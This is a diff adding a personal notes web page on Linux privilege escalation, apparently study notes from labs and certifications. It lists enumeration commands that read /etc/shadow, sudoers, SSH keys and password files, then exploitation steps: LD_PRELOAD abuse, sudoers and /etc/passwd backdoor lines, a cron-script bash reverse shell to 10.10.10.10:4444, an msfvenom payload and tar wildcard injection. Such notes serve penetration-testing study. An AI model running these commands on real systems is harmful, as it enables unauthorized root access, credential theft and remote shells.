@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+
+<head>
+  <meta https-equiv="content-type" content="text/html; charset=UTF-8">
+
+  <title>Linux Privesc</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content="My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content="https://eli2k.com/resources/images/homepage.png">
+  
+  <link rel="stylesheet" href="https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href="https://eli2k.com/resources/images/bluscrn.gif" type="image/gif">
+  <link rel="stylesheet" href="https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+	<input type="checkbox" class="theme-switch" id="theme-switch"/>
+	<div id="page">
+		<label for="theme-switch" class="switch-label"></label>
+  <body class="line-numbers">
+  <script src="https://eli2k.com/resources/js/prism.js"></script>
+  <script>
+    NekoType = "robot"
+  </script>
+  <h1 id=nl>
+    <script src="https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a>
+  </h1>
+  <div id="container">
+    <div id="header">
+      <div class="text-container">
+        <span>E</span>
+        <span>L</span>
+        <span>I</span>
+        <span>2</span>
+        <span>K</span>
+       </div>
+    </div>
+
+    <div id="left-sidebar"></div>
+    <div class="divider"></div>
+    <div class="pageContent">
+
+      <div class="nav border">
+        <ul>
+          <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+            <li>Home
+            </li>
+          </a>
+          <a href="https://github.com/Eli2k765" title="My Github.">
+            <li>Github
+            </li>
+          </a>
+
+        </ul>
+      </div>
+      <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+        <div class="box">
+          <div class="inner-box-content">
+            <div class="article-wrapper">
+              <h1>Linux Privilege Escalation</h1>
+              <p class="alert">Enumeration is one of the most important things to do when trying to escalate privileges. I'll talk about that first then move into exploiting some of the frequently found misconfigurations and vulnerabilities.</p>
+      	      <strong>Last updated: May 4th, 2023</strong>
+      	      <article>
+      	      <div id="contain">
+      	      <h2>Local Enumeration</h2>
+      	      <h3>System</h3>
+              <div>
+      	       <pre><code class="language-bash">uname -a
+ls /etc/*-release
+cat /proc/version
+cat /etc/issue
+cat /proc/cpuinfo
+cat /proc/meminfo
+lshw
+lscpu
+lsmod
+df -h
+lspci
+lsusb
+ps aux ## if anything looks out of the ordinary run pspy and you might find smth
+ls -al /etc/init.d/
+find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la
+env
+echo $PATH
+#Installed Packages
+rpm -qa
+dpkg -l
+pacman -qe</code></pre>
+              </div>
+      	      <h3>User</h3>
+              <div>
+      	       <pre><code class="language-bash">whoami
+id
+#interesting group?
+find / -group *group* 2>/dev/null
+sudo -l
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+cat /etc/sudoers
+ls -als /home/*/.ssh
+ls -als /home/*/.gnupg/
+ls -als /home/*/.config/
+last -a
+w
+history
+getcap -r / 2>/dev/null</code></pre>
+              </div>
+      	      <h3>Network</h3>
+              <div>
+      	       <pre><code class="language-bash">ifconfig -a #Network interfaces
+hostname -f
+cat /etc/hosts
+ip a
+ip route
+route -n
+ip addr show
+ss -twurp # Lists active connections and processes
+netstat -auntp
+arp -a #arp cache
+ip neigh
+netstat -ano #-l listening, -t and -u, -p pid 
+nmap -sT -p$ports portquiz.net #outbound firewall rules
+cat /etc/resolv.conf #DNS servers</code></pre>
+              </div>
+      	      <h3>Software</h3>
+              <div>
+      	       <pre><code class="language-bash">which python
+locate python
+dpkg -l | grep nginx
+python -v
+python --version
+#Check for mounted docker socket
+find / -name docker.sock 2>/dev/null</code></pre>
+              </div>
+      	      <h3>File and Task</h3>
+              <div>
+      	       <pre><code class="language-bash">#look for suid binaries
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+find / -type f -user root -perm -u=s 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+#get capabilities, look for =ep
+getcap -r / 2>/dev/null
+#last edited files
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+lsof
+#history file
+find /* -name *.*history* -print 2> /dev/null
+#writeable files
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+find / -writable ! -group $group -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+#timers
+systemctl list-timers --all
+#scheduled tasks
+crontab -l
+ls -al /etc/cron*
+find /etc/cron* -type f -perm -o+w -exec ls -l {} \
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+ps #-e all, -f format, -j jobs, -l long, -u user-oriented
+#Tampering with interesting files we have discovered
+ltrace file 2>/dev/null
+strace file 2>/dev/null
+#NFS Root Squash
+cat /etc/exports</pre></code>
+              </div>
+      	      <h3>Password</h3>
+              <div>
+      	       <pre><code class="language-bash">cat grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null
+locate password | more
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2>/dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+strings /dev/mem -n10 | grep -i PASS
+cat * | grep -i passw*
+cat /var/log/apache/access.log |grep -E “^user|^pass”</code></pre>
+              </div>
+              <h3>Information</h3>
+              <div>
+                <pre><code class="language-bash">ls -lh /var/mail
+
+                </code></pre>
+              </div>
+      	      <h2>Basic Exploitation</h2>
+      	      <h3>Sudo</h3>
+              <div>
+      	       <pre><code class="language-bash">#sudo privileges
+sudo -l #gtfobins for quickwins
+#LD_PRELOAD
+##Loads a library before other libraries, find code online for mal library
+##compile with gcc -fPIC shared shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=$PATH/shell.so vim</code></pre>
+              </div>
+              <h3></h3>
+      	      <h3>SUID</h3>
+              <div>
+      	       <pre><code class="language-bash">#suid bit
+find / -perm -u=s -type f 2>/dev/null
+#use gtfobins for wins
+#Shared Object
+strace suspicious_suid_binary | grep -iE "no such file or directory"
+#env vars</code></pre>
+              </div>
+      	      <h3>RootSquash</h3>
+              <div>
+      	       <pre><code class="language-bash">cat /etc/exports | grep root
+showmount -e &lt;victimip&gt;</code></pre>
+              </div>
+              <h3>Capabilities</h3>
+              <div>
+                <pre><code class="language-bash">
+                </code></pre>
+              </div>
+      	      <h3>Writeable Root Script</h3>
+              <div>
+      	       <pre><code class="language-bash">#add user to sudoers
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+#change root password
+echo "root:hacked" | chpasswd
+#add user to /etc/passwd
+echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd</code></pre>
+              </div>
+      	      <h3>Cron Jobs</h3>
+              <div>
+      	       <pre><code class="language-bash">#File Permissions
+cat /etc/crontab
+ls -l /usr/local/bin/overwrite.sh
+change to:
+	#!/bin/bash
+	bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+#Wildcards
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+chmod +x /home/user/shell.elf
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf</code></pre>
+
+
+                    </div>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        <div class="footer border"></div>
+    </div>
+  </div>
+  <script src="https://eli2k.com/resources/js/themeSwitch.js"></script>
+  <script src="https://eli2k.com/resources/js/collapseList.js"></script>
+  
+	</body>
+</body>
+
+</html>
